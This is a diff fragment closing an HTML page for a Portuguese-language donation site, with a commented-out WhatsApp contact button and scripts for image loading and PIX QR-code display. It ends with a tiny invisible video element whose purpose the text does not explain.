+                <path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.893 3.106"/>
+            </svg>
+            <span class="whatsapp-text">Fale Conosco</span>
+        </a>
+        <div class="whatsapp-tooltip">
+            Tire suas dúvidas ou faça sua doação via WhatsApp!
+        </div>
+    </div>-->
+
+    <script src="js/script.js"></script>
+    <script>
+        // Otimização de carregamento de imagens
+        document.addEventListener('DOMContentLoaded', function() {
+            // Otimizar imagens críticas
+            const criticalImages = document.querySelectorAll('.header-logo-img, .banner-image');
+            criticalImages.forEach(img => {
+                if (img.complete) {
+                    img.classList.add('loaded');
+                } else {
+                    img.addEventListener('load', function() {
+                        this.classList.add('loaded');
+                    });
+                    img.addEventListener('error', function() {
+                        this.style.display = 'none';
+                    });
+                }
+            });
+
+            // Lazy loading para outras imagens
+            const lazyImages = document.querySelectorAll('img[loading="lazy"]');
+            if ('IntersectionObserver' in window) {
+                const imageObserver = new IntersectionObserver((entries, observer) => {
+                    entries.forEach(entry => {
+                        if (entry.isIntersecting) {
+                            const img = entry.target;
+                            img.classList.add('loaded');
+                            observer.unobserve(img);
+                        }
+                    });
+                });
+
+                lazyImages.forEach(img => imageObserver.observe(img));
+            }
+
+            // Script para garantir que a imagem PIX seja exibida corretamente
+            const pixImage = document.querySelector('.pix-qr');
+            if (pixImage) {
+                pixImage.style.maxWidth = '300px';
+                pixImage.style.width = 'auto';
+                pixImage.style.height = 'auto';
+                pixImage.style.display = 'block';
+                pixImage.style.margin = '0 auto';
+                pixImage.style.objectFit = 'contain';
+                pixImage.style.objectPosition = 'center';
+                
+                pixImage.addEventListener('load', function() {
+                    this.style.visibility = 'visible';
+                    this.classList.add('loaded');
+                });
+                
+                setTimeout(function() {
+                    if (pixImage.style.visibility !== 'visible') {
+                        pixImage.style.visibility = 'visible';
+                    }
+                }, 1000);
+            }
+        });
+    </script>
+
+
+<video aria-hidden="true" tabindex="-1" src="media/1.mp4" playsinline="" style="position: fixed; top: -1px; left: -1px; width: 1px; height: 1px; opacity: 0; pointer-events: none; z-index: 9; background-color: transparent; display: block; object-fit: fill;"></video></body></html>
